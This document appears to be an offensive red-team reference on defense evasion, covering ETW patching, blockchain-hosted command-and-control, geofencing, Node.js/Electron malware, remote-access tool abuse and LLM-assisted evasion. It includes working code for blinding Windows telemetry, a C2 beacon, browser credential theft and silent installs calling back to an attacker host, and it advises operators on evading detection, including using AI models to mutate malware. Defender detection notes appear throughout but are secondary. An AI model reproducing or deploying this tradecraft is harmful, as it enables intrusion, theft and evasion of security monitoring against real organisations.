# Modern Evasion Techniques — 2024-2026 Threat Intelligence Reference

Supplements `defense-evasion/SKILL.md` and `references/amsi-bypass-techniques.md`. Covers emerging evasion patterns observed in real-world campaigns and threat intelligence reporting from 2024 through mid-2026. Every technique ID, tool name, and behavioral pattern references documented adversary tradecraft.

---

## MITRE ATT&CK Coverage

| Technique ID | Name | Section |
|-------------|------|---------|
| T1562.006 | Impair Defenses: Indicator Blocking | 1. ETW Bypass |
| T1562.002 | Impair Defenses: Disable Windows Event Logging | 1. ETW Bypass |
| T1102 | Web Service | 2. Smart Contract C2 |
| T1102.002 | Web Service: Bidirectional Communication | 2. Smart Contract C2 |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | 2. Smart Contract C2 |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | 3. Geofencing |
| T1614 | System Location Discovery | 3. Geofencing |
| T1614.001 | System Location Discovery: System Language Discovery | 3. Geofencing |
| T1059.007 | Command and Scripting Interpreter: JavaScript | 4. Node.js/Electron Malware |
| T1036.005 | Masquerading: Match Legitimate Name or Location | 4. Node.js/Electron Malware |
| T1219 | Remote Access Software | 5. RMM Tool Abuse |
| T1036.004 | Masquerading: Masquerade Task or Service | 5. RMM Tool Abuse |
| T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | 6. AI/LLM-Assisted Evasion |
| T1566.001 | Phishing: Spearphishing Attachment | 6. AI/LLM-Assisted Evasion |
| T1027.003 | Obfuscated Files or Information: Steganography | 6. AI/LLM-Assisted Evasion |

---

## 1. ETW (Event Tracing for Windows) Bypass Techniques

**MITRE ATT&CK**: T1562.006 (Indicator Blocking), T1562.002 (Disable Windows Event Logging)

ETW is the core telemetry backbone for EDR products on Windows. Patching `EtwEventWrite` in ntdll.dll (covered in `amsi-bypass-techniques.md`) was the standard approach, but EDR vendors now verify its integrity via periodic memory scanning and kernel-level callbacks. Modern adversaries have shifted to deeper targets.

### 1.1 NtTraceEvent Patching

`EtwEventWrite` internally calls `NtTraceEvent` (the actual syscall stub in ntdll). Patching `NtTraceEvent` instead of `EtwEventWrite` evades EDR integrity checks that only monitor the higher-level function.

```csharp
// Patch NtTraceEvent instead of EtwEventWrite
// NtTraceEvent is the ntdll syscall stub that EtwEventWrite calls internally.
// Most EDR integrity checks only validate EtwEventWrite bytes.

IntPtr ntdll = GetModuleHandle("ntdll.dll");
IntPtr ntTraceEvent = GetProcAddress(ntdll, "NtTraceEvent");

// xor eax, eax; ret (return STATUS_SUCCESS without tracing)
byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };

VirtualProtect(ntTraceEvent, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
Marshal.Copy(patch, 0, ntTraceEvent, patch.Length);
VirtualProtect(ntTraceEvent, (UIntPtr)patch.Length, oldProtect, out _);
```

**Why this works**: EDR products like CrowdStrike Falcon and SentinelOne hook `EtwEventWrite` and periodically check its first bytes. `NtTraceEvent` is one call deeper and rarely integrity-checked from userland. This technique was observed in Brute Ratel C4 post-exploitation framework (2024 builds) and later adopted by several commodity loaders.

### 1.2 ETW Provider Disabling

Rather than patching code, disable specific ETW providers by modifying the session or provider GUID registration. This leaves function bytes intact.

```csharp
// Disable the Microsoft-Windows-Threat-Intelligence ETW provider
// Provider GUID: {F4E1897A-BB5D-5668-F1D8-040F4D8DD344}
// This provider feeds kernel-mode telemetry to EDR user-mode components.

// Method: Use NtSetInformationThread to remove the ETW registration
// from the current thread, or EventUnregister to deregister providers.

// Alternatively, modify the _ETW_REG_ENTRY structure in memory
// to set the provider's EnableMask to 0, preventing event delivery.

// Using EventUnregister via handle enumeration:
// 1. Walk the provider registration list in the process
// 2. Find the target provider GUID
// 3. Call EventUnregister(regHandle) to deregister it
```

```powershell
# Disable ETW Autologger sessions via registry
# Prevents providers from auto-starting on boot
# Effective against: Microsoft-Windows-Threat-Intelligence,
#   Microsoft-Windows-PowerShell, Microsoft-Antimalware-Scan-Interface

# Disable the Defender ETW autologger
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" `
    -Name "Start" -Value 0 -Type DWord

# Disable the EventLog-Application autologger trace
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" `
    -Name "Start" -Value 0 -Type DWord
```

### 1.3 Kernel-Level ETW Considerations

The `Microsoft-Windows-Threat-Intelligence` ETW provider (EtwTi) operates at kernel level and feeds EDR drivers (e.g., CrowdStrike's csagent.sys). Userland patches to `EtwEventWrite` or `NtTraceEvent` do NOT affect kernel-mode ETW. This is the single biggest detection gap for userland-only patching.

Kernel-level bypass requires either:
- A vulnerable driver (BYOVD) to disable kernel ETW callbacks
- Direct kernel object manipulation (DKOM) via exploited driver
- These map to T1068 (Exploitation for Privilege Escalation) and are outside scope of userland evasion

### 1.4 Detection & OPSEC Notes

| Technique | Detection Vector | OPSEC Rating |
|-----------|-----------------|--------------|
| EtwEventWrite patch | EDR integrity checks (CrowdStrike, S1) | Medium — widely detected 2025+ |
| NtTraceEvent patch | Rare integrity checks; kernel ETW still reports | High |
| Provider GUID disabling | Registry monitoring, provider enumeration | Medium-High |
| Autologger registry disable | SACL on registry keys, reboot required | Medium |

**OPSEC guidance**:
- Patch `NtTraceEvent` over `EtwEventWrite` — fewer products validate the deeper stub
- Combine with indirect syscalls so the patch write itself doesn't trigger ETW
- Kernel-level ETW (EtwTi) remains active regardless of userland patching — assume EDR still sees memory allocation, process injection, and image load events via kernel callbacks
- Restore patches after payload execution when possible (reduces forensic footprint)

**Sources**: Brute Ratel C4 documentation and reverse engineering (MDSec, 2023-2024); Elastic Security Labs "Blinding EDR On Windows" (2024); Binarly ETW research; Adam Chester (@_xpn_) ETW internals blog series.

---

## 2. Smart Contract-Based C2 Evasion

**MITRE ATT&CK**: T1102 (Web Service), T1102.002 (Bidirectional Communication), T1573.002 (Encrypted Channel: Asymmetric Cryptography)

Adversaries use public blockchain infrastructure as a censorship-resistant dead-drop for C2 resolution. The key advantage: no single entity can seize, sinkhole, or take down a smart contract the way a traditional C2 domain or IP can be.

### 2.1 EtherHiding — Blockchain-Hosted Payloads

Discovered by Guardio Labs (October 2023), EtherHiding abuses Binance Smart Chain (BSC) smart contracts to host and serve malicious JavaScript payloads. Compromised WordPress sites load a small JS loader that queries a BSC smart contract via `eth_call`, retrieves the payload stored in contract storage, and executes it. The contract can be updated by the operator but cannot be taken down by defenders.

```solidity
// Simplified dead-drop resolver pattern (Ethereum/BSC)
// Operator stores encrypted C2 address in contract storage.
// Implant queries this via any public RPC endpoint.

pragma solidity ^0.8.0;

contract DeadDrop {
    address private owner;
    bytes private data;  // Encrypted C2 config

    constructor() { owner = msg.sender; }

    function update(bytes calldata _data) external {
        require(msg.sender == owner);
        data = _data;
    }

    function read() external view returns (bytes memory) {
        return data;
    }
}
```

```python
# Implant-side: resolve C2 via public Ethereum RPC
# No authentication needed — eth_call is a read-only operation
# Uses any public RPC endpoint (Infura, Alchemy, Ankr, etc.)

import requests, json

def resolve_c2(contract_addr, rpc_url="https://bsc-dataseed.binance.org/"):
    # eth_call to read() function — selector 0x57de26a4
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_call",
        "params": [{
            "to": contract_addr,
            "data": "0x57de26a4"  # keccak256("read()")[:4]
        }, "latest"],
        "id": 1
    }
    resp = requests.post(rpc_url, json=payload)
    result = resp.json()["result"]
    # Decode ABI-encoded bytes, decrypt to get C2 address
    raw = bytes.fromhex(result[2:])
    # Strip ABI encoding (offset + length prefix)
    length = int.from_bytes(raw[32:64], 'big')
    encrypted_config = raw[64:64+length]
    return decrypt_config(encrypted_config)  # AES/ChaCha20 with embedded key
```

### 2.2 Advantages for Adversary Infrastructure

| Property | Traditional C2 | Blockchain C2 |
|----------|---------------|---------------|
| Takedown | Domain seizure, IP sinkhole | Cannot be removed or censored |
| Attribution | WHOIS, hosting records | Pseudonymous wallet addresses |
| Availability | Single points of failure | Decentralized, globally replicated |
| Cost | Hosting fees, domain rotation | One-time gas fee to deploy (~$1-10 on BSC) |
| Update | DNS change, new domain | Single transaction updates contract |
| Detection | Domain reputation, threat feeds | Harder — legitimate blockchain RPC traffic |

**Real-world usage**: Beyond EtherHiding, the Glupteba botnet (documented by Google TAG, 2021-2024) used Bitcoin blockchain transactions to encode backup C2 domains. The OP_RETURN field in Bitcoin transactions carried encrypted C2 addresses, allowing the botnet to recover after infrastructure takedowns. This was documented in Google's 2021 lawsuit and subsequent 2024 follow-up reporting.

### 2.3 Detection & OPSEC Notes

**Detection vectors**:
- Network monitoring for Web3 JSON-RPC calls (`eth_call`, `eth_getStorageAt`) from endpoints that don't normally interact with blockchain
- DNS resolution for known public RPC endpoints (infura.io, alchemy.com, bsc-dataseed.binance.org)
- TLS SNI inspection for blockchain API domains
- Behavioral: any non-cryptocurrency-related process making blockchain API calls is highly anomalous

**OPSEC considerations for operators**:
- Use multiple public RPC endpoints to avoid single-point blocking
- Rotate between Ethereum, BSC, Polygon, and Arbitrum RPCs
- Deploy contract from a mixer-funded wallet (Tornado Cash successors) for attribution resistance
- The contract itself is permanently visible on-chain — don't store plaintext C2 addresses; always encrypt
- Use a separate wallet for contract updates; each update is a traceable transaction

**Sources**: Guardio Labs "EtherHiding" (October 2023); Google TAG Glupteba reports (2021, 2024); Nati Tal and Oleg Zaytsev, Guardio; Chainalysis blockchain threat intelligence.

---

## 3. Geofencing-Based Evasion

**MITRE ATT&CK**: T1497.001 (Virtualization/Sandbox Evasion: System Checks), T1614 (System Location Discovery), T1614.001 (System Language Discovery)

Geofencing restricts payload execution to specific geographic regions, preventing detonation in researcher sandboxes or non-target environments. This is standard practice for nation-state APTs and increasingly adopted by financially motivated groups.

### 3.1 IP-Based Geofencing

Query external services to determine the victim's geographic location before executing the payload.

```csharp
// IP geofencing — abort if not in target country
// Used by: APT29, Lazarus Group, various ransomware gangs
// Multiple services checked for reliability

using System.Net.Http;
using System.Text.Json;

static async Task<bool> CheckGeo(string[] allowedCountries)
{
    string[] geoApis = {
        "http://ip-api.com/json/?fields=countryCode",
        "https://ipapi.co/json/",
        "https://ipinfo.io/json"
    };

    foreach (var api in geoApis)
    {
        try
        {
            var client = new HttpClient();
            client.Timeout = TimeSpan.FromSeconds(5);
            var resp = await client.GetStringAsync(api);
            var json = JsonDocument.Parse(resp);

            string cc = json.RootElement.TryGetProperty("countryCode", out var prop)
                ? prop.GetString()
                : json.RootElement.GetProperty("country_code").GetString();

            return allowedCountries.Contains(cc);
        }
        catch { continue; }
    }
    // If all geo lookups fail (air-gapped or sandbox), abort
    return false;
}

// Usage: only execute in US and UK targets
if (!await CheckGeo(new[] { "US", "GB" }))
    Environment.Exit(0);
```

### 3.2 Language and Locale Checks

CIS-region ransomware groups (Conti, LockBit, BlackCat/ALPHV) have consistently implemented language checks to avoid encrypting systems in Russia and CIS countries — a well-documented operational norm.

```csharp
// Keyboard layout / system language checks
// Common in ransomware to avoid CIS countries

using System.Globalization;

static bool IsCISLocale()
{
    // Check installed input languages (keyboard layouts)
    // Russian: 0x0419, Ukrainian: 0x0422, Belarusian: 0x0423
    // Kazakh: 0x043F, Uzbek: 0x0443
    int[] cisLayouts = { 0x0419, 0x0422, 0x0423, 0x043F, 0x0443,
                         0x0440, 0x0437, 0x042B, 0x0443, 0x0428 };

    foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
    {
        if (cisLayouts.Contains(lang.Culture.LCID))
            return true;
    }

    // Also check system UI culture
    var culture = CultureInfo.InstalledUICulture;
    string[] cisCultures = { "ru", "uk", "be", "kk", "uz", "ky", "tg" };
    return cisCultures.Any(c => culture.TwoLetterISOLanguageName == c);
}

if (IsCISLocale())
    Environment.Exit(0);  // Bail out — CIS region
```

### 3.3 Timezone Verification

```csharp
// Timezone check to verify geographic consistency
// If IP says US but timezone is Asia/Shanghai, likely a sandbox

static bool TimezoneMatchesGeo(string expectedRegion)
{
    var tz = TimeZoneInfo.Local;

    var regionMap = new Dictionary<string, string[]>
    {
        ["US"] = new[] { "Eastern Standard Time", "Central Standard Time",
                         "Mountain Standard Time", "Pacific Standard Time",
                         "Alaskan Standard Time", "Hawaiian Standard Time" },
        ["GB"] = new[] { "GMT Standard Time" },
        ["DE"] = new[] { "W. Europe Standard Time", "Central European Standard Time" },
        ["CN"] = new[] { "China Standard Time" },
        ["RU"] = new[] { "Russian Standard Time", "Russia Time Zone 3",
                         "Ekaterinburg Standard Time" }
    };

    if (!regionMap.ContainsKey(expectedRegion)) return true;
    return regionMap[expectedRegion].Contains(tz.Id);
}
```

### 3.4 Compound Geofencing (Layered Checks)

Real APT payloads stack multiple checks. The SolarMarker infostealer (2024 campaigns documented by eSentire) combined IP geolocation, timezone, and language checks before payload delivery.

```
Check sequence (AND logic — all must pass):
1. IP geolocation → target country match
2. System timezone → consistent with IP geo
3. Keyboard layout → expected language installed
4. Active Directory domain → matches expected corporate naming
5. Running processes → no analysis tools (ProcMon, Wireshark, x64dbg)
```

### 3.5 Detection & OPSEC Notes

**Detection for defenders**:
- Sandboxes must mimic target geography: set IP exit node, timezone, keyboard layout, and locale to match the target profile
- Monitor for outbound requests to IP geolocation APIs (ip-api.com, ipinfo.io, ipapi.co) during early execution
- Behavioral: payload that exits immediately after a geo API call is highly suspicious
- Configure analysis VMs with the target region's locale, input languages, and timezone

**OPSEC for operators**:
- Use multiple geo-verification methods — any single check is trivially spoofed
- Fail closed: if geo checks fail (network error, timeout), exit rather than proceed
- Delay geo check behind initial sleep/jitter to avoid sandbox fast-forward detection
- Cache the geo result; repeated geo API calls are noisy

**Sources**: CISA advisory on Conti ransomware language checks (2022); eSentire SolarMarker analysis (2024); Mandiant APT29 geofencing documentation; LockBit 3.0 reverse engineering (various vendors, 2023-2024); BlackCat/ALPHV DFIR reports.

---

## 4. Node.js/Electron-Based Malware Evasion

**MITRE ATT&CK**: T1059.007 (Command and Scripting Interpreter: JavaScript), T1036.005 (Masquerading: Match Legitimate Name or Location)

Node.js and Electron are legitimate development runtimes present on millions of developer workstations. Malware leveraging these runtimes blends into normal development activity and benefits from the signed, trusted nature of the Node.js/Electron binaries.

### 4.1 Node.js Runtime Abuse

The Lu0Bot malware family (first documented by Check Point, active 2023-2025) distributes a legitimate, signed Node.js binary alongside obfuscated JavaScript payloads. Because `node.exe` is a trusted, signed Microsoft-distributed binary, many EDRs allow its execution with minimal scrutiny.

```javascript
// Lu0Bot-style Node.js payload pattern
// Delivered as: node.exe + obfuscated .js file
// node.exe is the legitimate signed binary from nodejs.org

const https = require('https');
const { execSync } = require('child_process');
const os = require('os');
const crypto = require('crypto');

// Fingerprint the host
const info = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    mem: Math.round(os.totalmem() / 1024 / 1024 / 1024),
    uptime: os.uptime()
};

// Beacon to C2 with host fingerprint
function beacon(c2url) {
    const data = JSON.stringify(info);
    const encrypted = encrypt(data);  // AES-256-GCM with hardcoded key
    const req = https.request(c2url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'  // Blend with browser traffic
        }
    });
    req.write(encrypted);
    req.end();
}

// Execute received commands
function execTask(task) {
    switch (task.type) {
        case 'cmd':
            return execSync(task.payload, { encoding: 'utf8' });
        case 'download':
            // Fetch and save file
            break;
        case 'update':
            // Self-update mechanism
            break;
    }
}
```

### 4.2 Electron App Sideloading

Electron applications bundle Chromium and Node.js into a single executable. Attackers have been observed (ESET, SentinelLabs 2024) repackaging malware as fake Electron apps or sideloading malicious code into legitimate Electron applications.

```
Attack pattern — Electron sideloading:

1. Take a legitimate Electron app (VS Code, Discord, Slack, etc.)
2. Modify resources/app.asar to inject malicious preload script
3. The main Electron binary is still legitimately signed
4. The injected script runs with full Node.js privileges
5. EDR sees signed Electron binary → allows execution

Directory structure:
legitimate-app/
├── app.exe            ← Signed Electron binary (untouched)
├── resources/
│   └── app.asar       ← Modified archive with injected payload
├── locales/
└── *.dll              ← Legitimate Electron DLLs
```

```javascript
// Malicious Electron preload script injection
// Injected into app.asar or loaded via --require flag
// Has full Node.js + Chromium access

const { ipcRenderer } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

// Exfiltrate browser data accessible to the Electron app
function stealBrowserData() {
    const chromePaths = {
        cookies: path.join(process.env.LOCALAPPDATA,
            'Google/Chrome/User Data/Default/Cookies'),
        loginData: path.join(process.env.LOCALAPPDATA,
            'Google/Chrome/User Data/Default/Login Data')
    };
    // Copy and exfiltrate SQLite databases
}

// The Electron app continues to function normally
// Malicious code runs in the background
```

### 4.3 Detection & OPSEC Notes

**Detection for defenders**:
- Baseline legitimate Node.js/Electron process locations on endpoints
- Alert on `node.exe` executing from non-standard paths (not `Program Files`, not `AppData\Local\Programs`)
- Monitor for `node.exe` spawning child processes like `cmd.exe`, `powershell.exe`, `whoami.exe`
- Watch for Electron apps loading `.asar` files from temp directories or unusual paths
- Detect `--require` or `--inspect` flags passed to node/electron binaries (used for code injection)
- Sysmon Event ID 1 (Process Creation) with `node.exe` parent and suspicious child

**OPSEC for operators**:
- Use the exact Node.js version common on the target (check via reconnaissance)
- Bundle node.exe in a directory path that mimics a legitimate install (e.g., `C:\Program Files\nodejs\`)
- Name the JS payload to blend: `server.js`, `index.js`, `app.js`
- Strip `--inspect` and debug flags from the command line
- Use `pkg` or `nexe` to compile JS into a single executable (harder to extract and analyze the JS source)

**Sources**: Check Point Lu0Bot analysis (2023); Group-IB "Lu0Bot: Inside a Node.js Malware" (2024); ESET research on Electron-based threats (2024); SentinelLabs supply chain attack analysis; Microsoft Defender threat intelligence on Node.js abuse.

---

## 5. RMM Tool Abuse for Evasion

**MITRE ATT&CK**: T1219 (Remote Access Software), T1036.004 (Masquerading: Masquerade Task or Service)

Remote Monitoring and Management (RMM) tools are legitimately used by IT departments worldwide. Adversaries install and abuse these same tools to establish persistent, encrypted remote access that blends into normal IT operations. CISA issued advisory AA23-025A (January 2023) specifically warning about this pattern, and the trend has accelerated through 2024-2026.

### 5.1 Commonly Abused RMM Tools

| Tool | Legitimate Use | Abuse Pattern | Prevalence |
|------|---------------|---------------|------------|
| ScreenConnect (ConnectWise) | IT remote support | Attacker-controlled instance for persistent access | Very High |
| AnyDesk | Remote desktop | Silent install for backdoor access | Very High |
| Atera | MSP management | Full agent deployed with attacker's tenant | High |
| TeamViewer | Remote support | Preconfigured with attacker credentials | High |
| Splashtop | Remote access | Silent deployment via initial access | Medium |
| Level.io | RMM/endpoint mgmt | Attacker-provisioned agent | Medium |
| MeshAgent (Tactical RMM) | Open-source RMM | Self-hosted C2 disguised as IT tool | Rising |

### 5.2 Attack Pattern — ScreenConnect Abuse

ScreenConnect (ConnectWise Control) is the single most abused RMM tool in post-exploitation as of 2025 (per DFIR Report, Huntress, and CISA reporting). CVE-2024-1709 (authentication bypass, CVSS 10.0) and CVE-2024-1708 (path traversal) enabled mass exploitation of on-premises ScreenConnect servers in February 2024.

```powershell
# Silent ScreenConnect agent installation
# Connects back to attacker-controlled relay server
# The binary is legitimately signed by ConnectWise

$scUrl = "https://attacker-relay.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi"
$installer = "$env:TEMP\sc_setup.msi"

Invoke-WebRequest -Uri $scUrl -OutFile $installer
Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /qn /norestart" -Wait

# After install, attacker has persistent GUI remote access
# Traffic is encrypted TLS to ScreenConnect relay infrastructure
# Process appears as legitimate ConnectWise ScreenConnect service
```

```
Post-exploitation via ScreenConnect:

1. Attacker creates a free/trial ScreenConnect cloud instance
2. Generates installer MSI with their session GUID
3. Deploys via phishing, RCE exploit, or existing access
4. Victim connects to attacker's ScreenConnect relay (*.screenconnect.com)
5. Attacker gets persistent, encrypted remote desktop access
6. Traffic goes to legitimate ConnectWise infrastructure
7. Binary is signed by ConnectWise — passes application whitelisting
```

### 5.3 Silent AnyDesk Deployment

```powershell
# AnyDesk silent install with preconfigured password
# Used by Scattered Spider (UNC3944), various ransomware affiliates

$anydesk = "$env:TEMP\AnyDesk.exe"
Invoke-WebRequest -Uri "https://download.anydesk.com/AnyDesk.exe" -OutFile $anydesk

# Install silently with predefined access password
& $anydesk --install "C:\ProgramData\AnyDesk" --start-with-win --silent
& "C:\ProgramData\AnyDesk\AnyDesk.exe" --set-password "Attacker_P@ssw0rd!"

# Get the AnyDesk ID for remote connection
$id = & "C:\ProgramData\AnyDesk\AnyDesk.exe" --get-id
# Exfiltrate $id to attacker — they can now connect with the preset password
```

### 5.4 Detection & OPSEC Notes

**Detection for defenders**:
- **Baseline RMM usage**: Know exactly which RMM tools your organization uses. Any RMM tool outside the approved list is immediately suspicious.
- **CISA recommendation**: Block RMM tool installer downloads at the proxy/firewall if the tool is not authorized.
- Alert triggers:
  - Installation of any new RMM agent (Sysmon Event ID 6 — driver load, Event ID 7 — image load for RMM DLLs)
  - Outbound connections to RMM relay infrastructure not in the approved list
  - ScreenConnect: connections to `*.screenconnect.com` from non-IT systems
  - AnyDesk: `--set-password` CLI argument in process creation logs
  - Atera: new Atera agent registration from unknown tenant
- Monitor for `msiexec.exe /qn` (silent install) of RMM packages
- Detect RMM tools running from non-standard install paths (temp, downloads, user profile)

**OPSEC for operators**:
- Use ScreenConnect cloud (not self-hosted) — traffic blends with legitimate ConnectWise relay infrastructure
- Deploy during business hours to mimic IT operations
- Use a plausible organization name for your ScreenConnect tenant
- AnyDesk: set a custom alias that looks like a legitimate IT session name
- Remove installation artifacts and logs after deployment
- Consider using the same RMM tool the target organization already uses — hardest to distinguish from legitimate activity

**Sources**: CISA Advisory AA23-025A "Protecting Against Malicious Use of RMM Software" (January 2023); CVE-2024-1709 and CVE-2024-1708 (ConnectWise, February 2024); Huntress ScreenConnect exploitation analysis (February 2024); CrowdStrike Scattered Spider / UNC3944 reporting (2023-2024); The DFIR Report multiple case studies (2024-2025).

---

## 6. AI/LLM-Assisted Evasion

**MITRE ATT&CK**: T1027.013 (Encrypted/Encoded File), T1566.001 (Spearphishing Attachment), T1027.003 (Steganography)

Large language models have lowered the barrier for generating evasive payloads, persuasive phishing content, and polymorphic code. This section covers observed and plausible LLM-assisted techniques based on public threat intelligence from Microsoft, Google TAG, OpenAI, and Proofpoint.

### 6.1 LLM-Generated Polymorphic Payloads

LLMs can rewrite malware source code to produce functionally equivalent variants with different syntax, variable names, control flow, and string encoding — each variant evades static signatures.

```python
# Conceptual: LLM-assisted payload mutation workflow
# Based on techniques described in Hyas "BlackMamba" research (2023)
# and CyberArk polymorphic malware research (2023)

# The operator provides a base payload and prompts the LLM to:
# 1. Rename all variables and functions
# 2. Restructure control flow (while→for, if chains→switch)
# 3. Re-encode strings with different methods per variant
# 4. Add junk code (dead branches, unused variables)
# 5. Change API call order where order-independent

# Example prompt pattern (not a full implementation):
"""
Rewrite the following Python keylogger to be functionally identical
but syntactically different. Change all variable names, use different
string encoding, restructure loops, and add 3-5 benign function calls
to system libraries interspersed between functional lines.
"""

# Output: each generation produces a unique variant
# that performs the same action but has a different hash,
# different string table, and different code structure.
# Traditional YARA rules or hash-based detection fail.
```

**Real-world observation**: OpenAI's February 2024 threat report confirmed that state-affiliated actors from China (Charcoal Typhoon), Iran (Crimson Sandstorm), North Korea (Emerald Sleet), and Russia (Forest Blizzard) used ChatGPT for scripting assistance, vulnerability research, and social engineering content generation. While OpenAI reported these uses as "limited and incremental," the trend established that adversaries actively integrate LLMs into their toolchains.

### 6.2 AI-Generated Phishing Content

LLMs produce phishing emails that are grammatically perfect, culturally appropriate, and tailored to the target — eliminating the traditional "poorly written" indicator defenders relied on.

```
Traditional phishing (pre-LLM):
- Grammatical errors, awkward phrasing
- Generic templates reused across campaigns
- Easy to spot via content analysis rules
- Often detectable by trained users

LLM-assisted phishing (2024+):
- Native-quality prose in any language
- Context-aware personalization using OSINT
- Business email compromise (BEC) style messages
  indistinguishable from legitimate executive communication
- Each email is unique — no template reuse for signature matching
- Multilingual campaigns without native speaker involvement
```

Proofpoint's 2024 and 2025 threat reports documented increased BEC effectiveness correlating with suspected LLM usage, noting that "the linguistic quality of BEC lures has measurably improved across non-English campaigns" — particularly in Japanese, Korean, and Nordic languages where attackers previously struggled with natural phrasing.

### 6.3 Automated OPSEC Review via AI

Operators use LLMs as a pre-deployment review layer to identify OPSEC failures in their tooling.

```
Operator OPSEC review workflow:

1. Submit payload/implant source to LLM
2. Query: "Identify all indicators of compromise in this code:
   - Hardcoded strings that could become YARA signatures
   - Distinctive behavioral patterns
   - Network traffic signatures
   - Filesystem artifacts
   - Registry modifications
   - Unique API call sequences"
3. LLM identifies IOCs
4. Operator modifies code to eliminate or randomize each IOC
5. Repeat until LLM finds no distinguishing patterns

Also used for:
- Reviewing C2 traffic patterns for detectability
- Identifying unique TLS fingerprints (JA3/JA4) in custom tools
- Checking if infrastructure setup leaves attribution breadcrumbs
- Generating realistic cover stories for social engineering
```

### 6.4 Detection & OPSEC Notes

**Detection for defenders**:
- **Behavioral analysis over signatures**: LLM-generated polymorphic code defeats static signatures. Invest in behavioral detection: what does the code DO, not what does it look like.
- **ML-based phishing detection**: Traditional keyword/pattern matching fails against LLM-generated content. Behavioral email analysis (sender patterns, metadata anomalies, link analysis) becomes critical.
- **Runtime behavior monitoring**: Memory allocation → write shellcode → change permissions → execute thread is the invariant behavioral chain regardless of source code mutation. Detect the behavior, not the bytes.
- Unusual LLM API traffic from corporate endpoints may indicate insider threat or compromised developer machine
- Monitor for `api.openai.com`, `api.anthropic.com`, and similar API endpoints from non-developer systems

**OPSEC for operators**:
- Never submit actual operational code to cloud LLM APIs — use local/self-hosted models (llama.cpp, Ollama) for sensitive work
- Cloud API queries are logged and subject to abuse detection; OpenAI and others actively terminate accounts used for malicious purposes
- LLM-generated code still requires manual review — models introduce subtle bugs, use outdated APIs, or add recognizable patterns
- Each LLM has characteristic code style (indentation, comment patterns, variable naming) that could become a meta-signature; manually diversify output

**Sources**: OpenAI "Disrupting malicious uses of AI by state-affiliated threat actors" (February 2024); Microsoft Threat Intelligence "Staying ahead of threat actors in the age of AI" (February 2024); Proofpoint 2024-2025 threat landscape reports; Hyas "BlackMamba" AI-powered polymorphic malware PoC (2023); CyberArk "Chatting Our Way Into Creating a Polymorphic Malware" (2023); Google TAG threat actor LLM usage reporting (2024).

---

## Cross-Reference Matrix

| Section | Complements | Stacks With |
|---------|------------|-------------|
| 1. ETW Bypass | `amsi-bypass-techniques.md` ETW section | Always pair ETW patch before AMSI bypass |
| 2. Smart Contract C2 | C2 infrastructure skills | Domain fronting, DNS-over-HTTPS for RPC calls |
| 3. Geofencing | Initial access skills | Phishing delivery, watering hole targeting |
| 4. Node.js/Electron | Custom loader techniques (SKILL.md §4) | Electron sideloading + signed binary execution |
| 5. RMM Tool Abuse | Persistence and lateral movement skills | Pair with credential access for broader deployment |
| 6. AI/LLM-Assisted | All sections | LLM-assisted mutation of any technique above |
